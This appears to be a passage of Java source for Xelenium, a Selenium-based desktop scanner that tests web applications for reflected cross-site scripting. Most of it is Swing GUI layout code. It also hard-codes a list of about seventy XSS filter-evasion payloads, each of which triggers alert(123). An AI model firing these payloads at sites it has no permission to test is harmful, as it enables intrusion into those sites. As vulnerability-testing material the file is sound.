
import java.awt.Desktop;
import java.io.*;
import java.util.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.GroupLayout.Group;
import javax.swing.GroupLayout.ParallelGroup;
import javax.swing.GroupLayout.SequentialGroup;
import javax.swing.JLabel;
import javax.swing.JTextField;
import org.apache.commons.lang.StringEscapeUtils;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *Solution Name: Xelenium, powered by Selenium
 *This solution can be used to identify the Reflected Cross Site Scripting (XSS) bugs in web application
 *Please refer the attached Xelenium pdf document for the instructions about the usage of the tool.
 * @author VVK
 */
public class Xelenium extends javax.swing.JFrame {

    private final Vector<String> myVector = new Vector<String>();
    public HashMap<String,String> map = new HashMap<String,String>();
    public String logincreds = "";
    public Date Date_logger;    
    public ByteArrayOutputStream myOut = new ByteArrayOutputStream();
    public String stdOput;
    public String logFlag;
    //public Map<String,String> predef_fields = new HashMap<String,String>();
    public List<Map<String,String>> predef_urls = new ArrayList<Map<String,String>>();
    private JLabel [] txtbx_lbl = null;
    private JTextField [] txt_bx = null;
    private int pre_def_url_ind = 0;
    /**
     * Creates new form Xelenium
     */
    public Xelenium() {
    	//initializes the UI components
        initComponents();
        
    }


    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jTabbedPane2 = new javax.swing.JTabbedPane();
        jFrame1 = new javax.swing.JFrame();
        jFrame2 = new javax.swing.JFrame();
        jFrame3 = new javax.swing.JFrame();
        jPanel1 = new javax.swing.JPanel();
        jTabbedPane1 = new javax.swing.JTabbedPane();
        Xelenium = new javax.swing.JTabbedPane();
        Capture_Scan_Tab = new javax.swing.JPanel();
        Capture_Scan = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        URL_Txt_Field = new javax.swing.JTextField();
        Capture_Pages = new javax.swing.JButton();
        jLabel2 = new javax.swing.JLabel();
        jScrollPane1 = new javax.swing.JScrollPane();
        Captured_Pages_List = new javax.swing.JList();
        Remove_Btn = new javax.swing.JButton();
        Perform_XSSScan = new javax.swing.JButton();
        jPanel5 = new javax.swing.JPanel();
        jLabel6 = new javax.swing.JLabel();
        Uname_txt_field = new javax.swing.JTextField();
        jLabel7 = new javax.swing.JLabel();
        Pwd_txt_field = new javax.swing.JTextField();
        Pwd_Protected_chkbox = new javax.swing.JCheckBox();
        Predefine_Values_Tab = new javax.swing.JPanel();
        jLabel8 = new javax.swing.JLabel();
        Captured_URLs = new javax.swing.JComboBox();
        jScrollPane5 = new javax.swing.JScrollPane();
        Pre_Def_Fields = new javax.swing.JPanel();
        Attack_Vectors = new javax.swing.JPanel();
        jLabel3 = new javax.swing.JLabel();
        jScrollPane2 = new javax.swing.JScrollPane();
        Avl_Atk_Vctr = new javax.swing.JList();
        jLabel4 = new javax.swing.JLabel();
        jScrollPane3 = new javax.swing.JScrollPane();
        Sel_Atk_Vctr = new javax.swing.JList();
        Add = new javax.swing.JButton();
        Delete = new javax.swing.JButton();
        Remove = new javax.swing.JButton();
        jLabel5 = new javax.swing.JLabel();
        Atk_Vctr_TxtField = new javax.swing.JTextField();
        Include = new javax.swing.JButton();
        jPanel6 = new javax.swing.JPanel();
        jScrollPane4 = new javax.swing.JScrollPane();
        Log_Textarea = new javax.swing.JTextArea();
        Clear_btn = new javax.swing.JButton();

        javax.swing.GroupLayout jFrame1Layout = new javax.swing.GroupLayout(jFrame1.getContentPane());
        jFrame1.getContentPane().setLayout(jFrame1Layout);
        jFrame1Layout.setHorizontalGroup(
            jFrame1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        jFrame1Layout.setVerticalGroup(
            jFrame1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout jFrame2Layout = new javax.swing.GroupLayout(jFrame2.getContentPane());
        jFrame2.getContentPane().setLayout(jFrame2Layout);
        jFrame2Layout.setHorizontalGroup(
            jFrame2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        jFrame2Layout.setVerticalGroup(
            jFrame2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout jFrame3Layout = new javax.swing.GroupLayout(jFrame3.getContentPane());
        jFrame3.getContentPane().setLayout(jFrame3Layout);
        jFrame3Layout.setHorizontalGroup(
            jFrame3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        jFrame3Layout.setVerticalGroup(
            jFrame3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setResizable(false);

        jTabbedPane1.setFont(new java.awt.Font("Tahoma", 1, 13)); // NOI18N

        Xelenium.setAutoscrolls(true);
        Xelenium.setFont(new java.awt.Font("Tahoma", 1, 13)); // NOI18N

        Capture_Scan.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED));

        jLabel1.setText("Enter URL:");

        URL_Txt_Field.setToolTipText("Please enter valid url, starting with http:// or https://");
        URL_Txt_Field.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                URL_Txt_FieldActionPerformed(evt);
            }
        });
        URL_Txt_Field.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                URL_Txt_FieldKeyPressed(evt);
            }
        });

        Capture_Pages.setText("Capture Pages");
        Capture_Pages.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Capture_PagesActionPerformed(evt);
            }
        });

        jLabel2.setText("Captured Pages: ");

        jScrollPane1.setViewportView(Captured_Pages_List);

        Remove_Btn.setText("Remove");
        Remove_Btn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Remove_BtnActionPerformed(evt);
            }
        });

        Perform_XSSScan.setText("Perform XSS Scan");
        Perform_XSSScan.setToolTipText("Performs XSS Scan on the captured urls with the selected attack vectors.");
        Perform_XSSScan.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Perform_XSSScanActionPerformed(evt);
            }
        });

        jPanel5.setBorder(javax.swing.BorderFactory.createTitledBorder(null, "Login Creds:", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Tahoma", 1, 13))); // NOI18N

        jLabel6.setText("Username :");

        Uname_txt_field.setEnabled(false);

        jLabel7.setText("Password :");

        Pwd_txt_field.setEnabled(false);
        Pwd_txt_field.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Pwd_txt_fieldActionPerformed(evt);
            }
        });

        Pwd_Protected_chkbox.setText("Password Protected ?");
        Pwd_Protected_chkbox.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                Pwd_Protected_chkboxMouseClicked(evt);
            }
        });
        Pwd_Protected_chkbox.addItemListener(new java.awt.event.ItemListener() {
            public void itemStateChanged(java.awt.event.ItemEvent evt) {
                Pwd_Protected_chkboxItemStateChanged(evt);
            }
        });
        Pwd_Protected_chkbox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Pwd_Protected_chkboxActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel5Layout = new javax.swing.GroupLayout(jPanel5);
        jPanel5.setLayout(jPanel5Layout);
        jPanel5Layout.setHorizontalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel5Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel5Layout.createSequentialGroup()
                        .addComponent(Pwd_Protected_chkbox)
                        .addGap(0, 0, Short.MAX_VALUE))
                    .addGroup(jPanel5Layout.createSequentialGroup()
                        .addComponent(jLabel7)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(Pwd_txt_field, javax.swing.GroupLayout.PREFERRED_SIZE, 104, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(jPanel5Layout.createSequentialGroup()
                        .addComponent(jLabel6)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(Uname_txt_field, javax.swing.GroupLayout.PREFERRED_SIZE, 104, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
        );
        jPanel5Layout.setVerticalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel5Layout.createSequentialGroup()
                .addGap(24, 24, 24)
                .addComponent(Pwd_Protected_chkbox)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 28, Short.MAX_VALUE)
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel6)
                    .addComponent(Uname_txt_field, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(23, 23, 23)
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel7)
                    .addComponent(Pwd_txt_field, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(27, 27, 27))
        );

        javax.swing.GroupLayout Capture_ScanLayout = new javax.swing.GroupLayout(Capture_Scan);
        Capture_Scan.setLayout(Capture_ScanLayout);
        Capture_ScanLayout.setHorizontalGroup(
            Capture_ScanLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(Capture_ScanLayout.createSequentialGroup()
                .addGroup(Capture_ScanLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(Capture_ScanLayout.createSequentialGroup()
                        .addGap(26, 26, 26)
                        .addGroup(Capture_ScanLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(Capture_ScanLayout.createSequentialGroup()
                                .addComponent(jLabel1)
                                .addGap(44, 44, 44)
                                .addComponent(URL_Txt_Field, javax.swing.GroupLayout.PREFERRED_SIZE, 200, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(Capture_ScanLayout.createSequentialGroup()
                                .addGroup(Capture_ScanLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addGroup(Capture_ScanLayout.createSequentialGroup()
                                        .addComponent(jLabel2)
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                        .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 194, javax.swing.GroupLayout.PREFERRED_SIZE))
                                    .addGroup(Capture_ScanLayout.createSequentialGroup()
                                        .addGap(142, 142, 142)
                                        .addComponent(Capture_Pages)))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 72, Short.MAX_VALUE)
                                .addComponent(jPanel5, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))))
                    .addGroup(Capture_ScanLayout.createSequentialGroup()
                        .addGap(199, 199, 199)
                        .addComponent(Remove_Btn)))
                .addContainerGap(20, javax.swing.GroupLayout.PREFERRED_SIZE))
            .addGroup(Capture_ScanLayout.createSequentialGroup()
                .addGap(166, 166, 166)
                .addComponent(Perform_XSSScan)
                .addContainerGap())
        );
        Capture_ScanLayout.setVerticalGroup(
            Capture_ScanLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(Capture_ScanLayout.createSequentialGroup()
                .addGap(30, 30, 30)
                .addGroup(Capture_ScanLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(URL_Txt_Field, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel1))
                .addGroup(Capture_ScanLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(Capture_ScanLayout.createSequentialGroup()
                        .addGap(183, 183, 183)
                        .addComponent(jLabel2))
                    .addGroup(Capture_ScanLayout.createSequentialGroup()
                        .addGap(18, 18, 18)
                        .addGroup(Capture_ScanLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(Capture_ScanLayout.createSequentialGroup()
                                .addComponent(Capture_Pages)
                                .addGap(38, 38, 38)
                                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 218, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addComponent(jPanel5, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addGap(26, 26, 26)
                .addComponent(Remove_Btn)
                .addGap(47, 47, 47)
                .addComponent(Perform_XSSScan)
                .addContainerGap(66, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout Capture_Scan_TabLayout = new javax.swing.GroupLayout(Capture_Scan_Tab);
        Capture_Scan_Tab.setLayout(Capture_Scan_TabLayout);
        Capture_Scan_TabLayout.setHorizontalGroup(
            Capture_Scan_TabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(Capture_Scan, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        Capture_Scan_TabLayout.setVerticalGroup(
            Capture_Scan_TabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(Capture_Scan, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        Xelenium.addTab("Capture & Scan", Capture_Scan_Tab);

        jLabel8.setText("URLs :");

        Captured_URLs.addItemListener(new java.awt.event.ItemListener() {
            public void itemStateChanged(java.awt.event.ItemEvent evt) {
                Captured_URLsItemStateChanged(evt);
            }
        });
        Captured_URLs.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Captured_URLsActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout Pre_Def_FieldsLayout = new javax.swing.GroupLayout(Pre_Def_Fields);
        Pre_Def_Fields.setLayout(Pre_Def_FieldsLayout);
        Pre_Def_FieldsLayout.setHorizontalGroup(
            Pre_Def_FieldsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 616, Short.MAX_VALUE)
        );
        Pre_Def_FieldsLayout.setVerticalGroup(
            Pre_Def_FieldsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 442, Short.MAX_VALUE)
        );

        jScrollPane5.setViewportView(Pre_Def_Fields);

        javax.swing.GroupLayout Predefine_Values_TabLayout = new javax.swing.GroupLayout(Predefine_Values_Tab);
        Predefine_Values_Tab.setLayout(Predefine_Values_TabLayout);
        Predefine_Values_TabLayout.setHorizontalGroup(
            Predefine_Values_TabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(Predefine_Values_TabLayout.createSequentialGroup()
                .addGap(57, 57, 57)
                .addComponent(jLabel8, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(Captured_URLs, javax.swing.GroupLayout.PREFERRED_SIZE, 209, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(312, Short.MAX_VALUE))
            .addComponent(jScrollPane5)
        );
        Predefine_Values_TabLayout.setVerticalGroup(
            Predefine_Values_TabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(Predefine_Values_TabLayout.createSequentialGroup()
                .addGap(31, 31, 31)
                .addGroup(Predefine_Values_TabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel8)
                    .addComponent(Captured_URLs, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 46, Short.MAX_VALUE)
                .addComponent(jScrollPane5, javax.swing.GroupLayout.PREFERRED_SIZE, 432, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );

        Xelenium.addTab("Predefine Values", Predefine_Values_Tab);

        jLabel3.setText("Available Attack Vectors:");

        Avl_Atk_Vctr.setModel(new javax.swing.AbstractListModel() {
            String[] strings = { "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(123);\">", "<SCRIPT>alert(123);</SCRIPT>", "<IMG SRC=\"jav ascript:alert(123);\">", "<IMG SRC=\"javascript:alert(123);\">", "<IMG SRC=\" &#14; javascript:alert(123);\">", "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(123);>", "<<SCRIPT>alert(123);//<</SCRIPT>", "<SCRIPT <B>alert(123);</SCRIPT>", "<IMG SRC=\"javascript:alert(123);\"", "<iframe src=\"javascript:alert(123); <", "<SCRIPT>a=/XSS/\\nalert(123);</SCRIPT>", "\\\";alert(123);;//", "</TITLE><SCRIPT>alert(123);</SCRIPT>", "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(123);\">", "<BODY BACKGROUND=\"javascript:alert(123);\">", "<BODY ONLOAD=alert(123);>", "<IMG DYNSRC=\"javascript:alert(123);\">", "<IMG LOWSRC=\"javascript:alert(123);\">", "<BGSOUND SRC=\"javascript:alert(123);\">", "<BR SIZE=\"&{alert(123)}\">", "<LAYER SRC=\"javascript:alert(123);\"></LAYER>", "<LINK REL=\"stylesheet\" HREF=\"javascript:alert(123);\">", "¼script¾alert(123);¼/script¾", "<IFRAME SRC=\"javascript:alert(123);\"></IFRAME>", "<FRAMESET><FRAME SRC=\"javascript:alert(123);\"></FRAMESET>", "<TABLE BACKGROUND=\"javascript:alert(123);\">", "<TABLE><TD BACKGROUND=\"javascript:alert(123);\">", "<DIV STYLE=\"background-image: url(javascript:alert(123);)\">", "<DIV STYLE=\"background-image: url(&#1;javascript:alert(123);)\">", "<DIV STYLE=\"width: expression(alert(123));\">", "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(123)';</STYLE>", "<IMG STYLE=\"xss:expr/*XSS*/ession(alert(123))\">", "<XSS STYLE=\"xss:expression(alert(123))\">", "<STYLE TYPE=\"text/javascript\">alert(123);</STYLE>", "<STYLE>.XSS{background-image:url(\"javascript:alert(123)\");}</STYLE>", "<A CLASS=XSS></A>", "<!--[if gte IE 4]><SCRIPT>alert(123);</SCRIPT><![endif]-->", "<BASE HREF=\"javascript:alert(123);//\">", "<? echo('<SCR)';echo('IPT>alert(123)</SCRIPT>'); ?>", "<a href=\"javascript#alert(123);\">", "<div onmouseover=\"alert(123);\">", "<img src=\"javascript:alert(123);\">", "<img dynsrc=\"javascript:alert(123);\">", "<input type=\"image\" dynsrc=\"javascript:alert(123);\">", "<bgsound src=\"javascript:alert(123);\">", "&<script>alert(123);</script>", "&{alert(123);};", "<img src=&{alert(123);};>", "<link rel=\"stylesheet\" href=\"javascript:alert(123);\">", "<img src=\"mocha:alert(123);\">", "<img src=\"livescript:alert(123);\">", "<a href=\"about:<script>alert(123);</script>\">", "<body onload=\"alert(123);\">", "<div style=\"background-image: url(javascript:alert(123););\">", "<div style=\"behaviour: url([link to code]);\">", "<div style=\"binding: url([link to code]);\">", "<div style=\"width: expression(alert(123););\">", "<style type=\"text/javascript\">alert(123);</style>", "<object classid=\"clsid:...\" codebase=\"javascript:alert(123);\">", "<style><!--</style><script>alert(123);//--></script>", "<<script>alert(123);</script>", "<![CDATA[<!--]]<script>alert(123);//--></script>", "<!-- -- --><script>alert(123);</script><!-- -- -->", "<img src=\"blah\"onmouseover=\"alert(123);\">", "<img src=\"blah>\" onmouseover=\"alert(123);\">", "<xml src=\"javascript:alert(123);\">", "<xml id=\"X\"><a><b><script>alert(123);</script>;</b></a></xml>", "<div datafld=\"b\" dataformatas=\"html\" datasrc=\"#X\"></div>", "[\\xC0][\\xBC]script>alert(123);[\\xC0][\\xBC]/script>" };
            public int getSize() { return strings.length; }
            public Object getElementAt(int i) { return strings[i]; }
        });
        Avl_Atk_Vctr.setMaximumSize(new java.awt.Dimension(423, 1100));
        jScrollPane2.setViewportView(Avl_Atk_Vctr);

        jLabel4.setText("Selected Attack Vectors:");

        Sel_Atk_Vctr.setModel(new javax.swing.AbstractListModel() {
            String[] strings = { "<SCRIPT <B>alert(123);</SCRIPT>", "<<SCRIPT>alert(123);//<</SCRIPT>", "<SCRIPT>alert(123);</SCRIPT>" };
            public int getSize() { return strings.length; }
            public Object getElementAt(int i) { return strings[i]; }
        });
        jScrollPane3.setViewportView(Sel_Atk_Vctr);

        Add.setText("Add >>");
        Add.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                AddActionPerformed(evt);
            }
        });

        Delete.setText("Delete");
        Delete.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                DeleteActionPerformed(evt);
            }
        });

        Remove.setText("Remove<<");
        Remove.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                RemoveActionPerformed(evt);
            }
        });

        jLabel5.setText("Attack Vector:");

        Include.setText("Include");
        Include.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                IncludeActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout Attack_VectorsLayout = new javax.swing.GroupLayout(Attack_Vectors);
        Attack_Vectors.setLayout(Attack_VectorsLayout);
        Attack_VectorsLayout.setHorizontalGroup(
            Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(Attack_VectorsLayout.createSequentialGroup()
                .addGap(23, 23, 23)
                .addGroup(Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(Attack_VectorsLayout.createSequentialGroup()
                        .addComponent(jLabel5)
                        .addContainerGap())
                    .addGroup(Attack_VectorsLayout.createSequentialGroup()
                        .addComponent(jLabel3)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 219, Short.MAX_VALUE)
                        .addComponent(jLabel4)
                        .addGap(115, 115, 115))))
            .addGroup(Attack_VectorsLayout.createSequentialGroup()
                .addGroup(Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(Attack_VectorsLayout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 219, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(Attack_VectorsLayout.createSequentialGroup()
                        .addGap(35, 35, 35)
                        .addComponent(Atk_Vctr_TxtField, javax.swing.GroupLayout.PREFERRED_SIZE, 152, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(35, 35, 35)
                .addGroup(Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(Include, javax.swing.GroupLayout.PREFERRED_SIZE, 97, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(Remove)
                        .addComponent(Delete, javax.swing.GroupLayout.PREFERRED_SIZE, 97, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(Add, javax.swing.GroupLayout.PREFERRED_SIZE, 89, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 207, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(37, 37, 37))
        );
        Attack_VectorsLayout.setVerticalGroup(
            Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(Attack_VectorsLayout.createSequentialGroup()
                .addGroup(Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(Attack_VectorsLayout.createSequentialGroup()
                        .addGap(111, 111, 111)
                        .addComponent(Add)
                        .addGap(64, 64, 64)
                        .addComponent(Remove)
                        .addGap(65, 65, 65)
                        .addComponent(Delete))
                    .addGroup(Attack_VectorsLayout.createSequentialGroup()
                        .addGap(35, 35, 35)
                        .addGroup(Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel3)
                            .addComponent(jLabel4))
                        .addGap(18, 18, 18)
                        .addGroup(Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 323, Short.MAX_VALUE)
                            .addComponent(jScrollPane2))))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 39, Short.MAX_VALUE)
                .addComponent(jLabel5)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(Attack_VectorsLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(Atk_Vctr_TxtField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(Include))
                .addGap(59, 59, 59))
        );

        Xelenium.addTab("Attack Vectors", Attack_Vectors);

        Log_Textarea.setBackground(new java.awt.Color(240, 240, 240));
        Log_Textarea.setColumns(20);
        Log_Textarea.setEditable(false);
        Log_Textarea.setFont(new java.awt.Font("SansSerif", 0, 13)); // NOI18N
        Log_Textarea.setRows(5);
        Log_Textarea.setDisabledTextColor(new java.awt.Color(255, 0, 102));
        Log_Textarea.setSelectedTextColor(new java.awt.Color(255, 102, 102));
        jScrollPane4.setViewportView(Log_Textarea);

        Clear_btn.setText("Clear");
        Clear_btn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Clear_btnActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel6Layout = new javax.swing.GroupLayout(jPanel6);
        jPanel6.setLayout(jPanel6Layout);
        jPanel6Layout.setHorizontalGroup(
            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane4, javax.swing.GroupLayout.DEFAULT_SIZE, 639, Short.MAX_VALUE)
            .addGroup(jPanel6Layout.createSequentialGroup()
                .addGap(271, 271, 271)
                .addComponent(Clear_btn)
                .addContainerGap())
        );
        jPanel6Layout.setVerticalGroup(
            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel6Layout.createSequentialGroup()
                .addComponent(jScrollPane4, javax.swing.GroupLayout.PREFERRED_SIZE, 446, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(29, 29, 29)
                .addComponent(Clear_btn)
                .addGap(0, 44, Short.MAX_VALUE))
        );

        Xelenium.addTab("Log", jPanel6);

        jTabbedPane1.addTab("Xelenium", Xelenium);

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane1)
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTabbedPane1)
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
